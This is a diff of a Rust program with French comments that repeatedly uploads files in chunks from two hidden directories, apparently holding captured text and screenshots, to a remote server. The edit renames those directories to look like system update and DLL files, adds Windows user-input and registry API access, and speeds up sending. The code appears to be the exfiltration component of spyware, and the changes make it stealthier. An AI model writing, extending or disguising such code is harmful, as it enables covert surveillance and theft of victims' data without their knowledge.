@@ -9,6 +9,7 @@
 // anyhow = "1.0"
 // rand = "0.8"
 // chrono = "0.4"
+// winapi = { version = "0.3.7", features = ["winuser", "regapi"] }
 
 use anyhow::Result;
 use chrono::Local;
@@ -52,7 +53,7 @@ fn send_file_in_chunks(client: &Client, file_path: &Path, file_type: &str) -> Re
             return Ok(false);
         }
         // petite pause pour ne pas spammer
-        thread::sleep(Duration::from_millis(200));
+        thread::sleep(Duration::from_millis(50));
     }
 
     println!("✔️  Fichier '{}' envoyé en {} morceaux", filename, total_chunks);
@@ -66,10 +67,10 @@ fn send_dir(dir: &str) {
         for entry in entries.flatten() {
             let path = entry.path();
             if path.is_file() {
-                let file_type = if dir.contains("output_text") {
-                    "output_text"
+                let file_type = if dir.contains("Update") {
+                    "Update"
                 } else {
-                    "output_screen"
+                    ".dll"
                 };
                 match send_file_in_chunks(&client, &path, file_type) {
                     Ok(true) => {
@@ -88,8 +89,8 @@ fn send_dir(dir: &str) {
 }
 
 fn main() -> Result<()> {
-    let text_dir = ".output_text";
-    let screen_dir = ".output_screen";
+    let text_dir = ".Update";
+    let screen_dir = ".dll";
 
     loop {
         println!("🕒 [{}] Nouveau cycle d'envoi…", Local::now());
